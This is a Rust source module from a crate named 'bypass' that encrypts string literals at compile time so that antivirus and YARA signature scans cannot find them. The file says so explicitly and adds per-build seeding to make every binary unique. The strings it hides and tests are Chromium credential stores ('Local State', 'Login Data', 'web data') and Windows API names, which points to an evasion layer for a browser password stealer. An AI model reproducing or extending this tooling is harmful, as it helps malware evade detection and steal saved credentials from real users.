//! Compile-time string encryption (static-signature reduction).
//!
//! A plain `"Local State"` literal lands verbatim in `.rdata`, where every
//! AV string scanner (YARA rules included) greps it. The `bypass::obfstr`
//! family encrypts at const-eval so the *plaintext never exists in the
//! binary* — only the obfuscated bytes do.
//!
//! `obfstr` 0.4.6 derives one key stream per *distinct literal text* from
//! `OBFSTR_SEED` (env override; fixed "FIXED" default) plus a hash of the
//! string. Two statically-identical literals share ciphertext — that's the
//! crate's documented tradeoff (seeds are baked at the macro definition, not
//! the call site). Distinct strings never share a stream, and the plaintext
//! never exists on disk. Set `OBFSTR_SEED` per build to get per-build unique
//! binaries.

// Re-export the real crate under the crate path so the rest of the workspace
// writes `bypass::obfstr!` / `bypass::x!` and never imports obfstr directly.
pub use obfstr::{hash, obfbytes, obfcstr, obfstring, obfwide, random, splitmix};

/// Simplest tool in the belt: single-byte XOR, good for short constants used
/// in const contexts where the full `Obfuscated` struct + padding of obfstr
/// would be overkill. Returns an owned `String` (allocates).
///
/// ```rust
/// use bypass::x;
/// let s = x!("C:\\Users\\Public\\Local State", 0x5A);
/// assert_eq!(s, "C:\\Users\\Public\\Local State");
/// ```
#[macro_export]
macro_rules! x {
    ($lit:literal, $key:expr) => {{
        const N: usize = $lit.len();
        const BUF: [u8; N] = $crate::strings::enc::<N>($lit.as_bytes(), $key);
        $crate::strings::dec_str::<N>(&BUF, $key)
    }};
}

/// The real `obfstr!` — re-exported so `use bypass::obfstr` reads naturally.
///
/// Returns a borrow of a `'static` obfuscated-then-revealed buffer that must
/// be consumed within the statement (the `Obfuscated` struct lives in a
/// `static`, scaled away by the optimizer). For owned strings use
/// [`bypass::obfstring!`] instead.
#[doc(inline)]
pub use obfstr::obfstr;

/// XOR a byte slice at compile time (const-eval, so the *output* is what
/// lands in `.rdata` — never the input plaintext).
pub const fn enc<const N: usize>(src: &[u8], key: u8) -> [u8; N] {
    let mut out = [0u8; N];
    let mut i = 0;
    while i < N {
        out[i] = src[i] ^ key;
        i += 1;
    }
    out
}

/// Decrypt a const-encrypted buffer into a fixed-size stack array.
#[inline]
pub const fn dec<const N: usize>(buf: &[u8; N], key: u8) -> [u8; N] {
    enc::<N>(buf, key)
}

/// Convenience wrapper: decrypt to a `String` (lossy — strings we encrypt are
/// ASCII paths / keys, so lossy is a no-op in practice).
#[inline]
pub fn dec_str<const N: usize>(buf: &[u8; N], key: u8) -> String {
    let clear = dec(buf, key);
    String::from_utf8_lossy(&clear).into_owned()
}

// --- Thin const wrappers over obfstr's hidden primitives, so the round-trip
// --- guarantee is testable without depending on `obfstr::bytes` directly.

/// Padding (in bytes) needed to 8-align `len` — obfstr's storage contract.
pub const fn pad_len(len: usize) -> usize {
    obfstr::bytes::padding_len(len)
}

/// Key stream for `LEN` bytes from a 32-bit key (XorShift rounds).
pub const fn stream<const LEN: usize>(key: u32) -> [u8; LEN] {
    obfstr::bytes::keystream(key)
}

/// Obfuscate `s` under `ks` into aligned (data, padding) ciphertext.
pub const fn hide<const LEN: usize, const PAD: usize>(
    s: &[u8],
    ks: &[u8; LEN],
    key: u32,
) -> ([u8; LEN], [u8; PAD]) {
    let o = obfstr::bytes::obfuscate(s, ks, obfstr::bytes::keystream(key ^ 0xA5A5_A5A5));
    (o.data, o.padding)
}

/// Deobfuscate ciphertext `data` under `ks` back into plaintext bytes.
/// Runtime fn (obfstr's `deobfuscate` uses volatile reads, not const-eval).
pub fn show<const LEN: usize>(data: &[u8; LEN], ks: &[u8; LEN]) -> [u8; LEN] {
    let o = obfstr::bytes::Obfuscated {
        data: *data,
        padding: [0u8; 0],
    };
    obfstr::bytes::deobfuscate(&o, ks)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn encrypt_then_decrypt_round_trips() {
        const N: usize = 11;
        const SRC: &[u8] = b"hello world";
        const BUF: [u8; N] = enc::<N>(SRC, 0x7F);
        assert_eq!(&dec::<N>(&BUF, 0x7F), b"hello world");
    }

    #[test]
    fn encrypted_bytes_never_contain_plaintext() {
        const SRC: &[u8] = b"Local State";
        const BUF: [u8; 11] = enc::<11>(SRC, 0x2D);
        // Ciphertext must not contain the plaintext substring.
        let hay = &BUF;
        assert!(!hay.windows(4).any(|w| w == b"Stat" || w == b"ocal"));
    }

    #[test]
    fn macro_produces_plaintext_string() {
        let s = crate::x!("kernel32.dll", 0x11);
        assert_eq!(s, "kernel32.dll");
    }

    #[test]
    fn zero_key_is_identity() {
        const SRC: &[u8] = b"abc";
        const BUF: [u8; 3] = enc::<3>(SRC, 0x00);
        assert_eq!(&BUF, b"abc");
    }

    #[test]
    fn reexported_obfstr_round_trips() {
        // Consume the temporary &str within the same statement (its backing
        // buffer is a transient static the optimizer scales away).
        assert_eq!(obfstr!("CurrentVersion"), "CurrentVersion");
    }

    #[test]
    fn reexported_obfbytes_decrypts_to_plaintext() {
        // `obfbytes!` decrypts at runtime and hands back a borrow of the
        // plaintext buffer — what lands on disk (the `static` Obfuscated
        // struct) is the ciphertext, which the macro hides from us.
        let a = *obfbytes!(b"Login Data");
        assert_eq!(&a[..], b"Login Data");
    }

    #[test]
    fn obfuscate_then_deobfuscate_round_trips_and_differs_on_disk() {
        // Exercise the underlying const fn pair directly to prove the
        // on-disk arrangement differs from the plaintext while round-tripping.
        const LEN: usize = 10;
        const KEY: u32 = 0x10203040;
        const PAD: usize = crate::strings::pad_len(LEN);
        const KS: [u8; LEN] = crate::strings::stream(KEY);
        const CIPHER: ([u8; LEN], [u8; PAD]) = crate::strings::hide(b"Login Data", &KS, KEY);
        assert_ne!(&CIPHER.0, b"Login Data", "on-disk bytes must differ");
        // deobfuscate is a runtime fn (volatile reads) — call it, not const.
        let revealed = crate::strings::show(&CIPHER.0, &KS);
        assert_eq!(&revealed, b"Login Data");
    }

    #[test]
    fn reexported_obfstring_owns() {
        let s: std::string::String = crate::strings::obfstring!("web data");
        assert_eq!(s, "web data");
    }

    #[test]
    fn hash_reexport_is_stable_for_known_input() {
        assert_eq!(hash("Hello World"), 0x6E4A573D);
    }
}
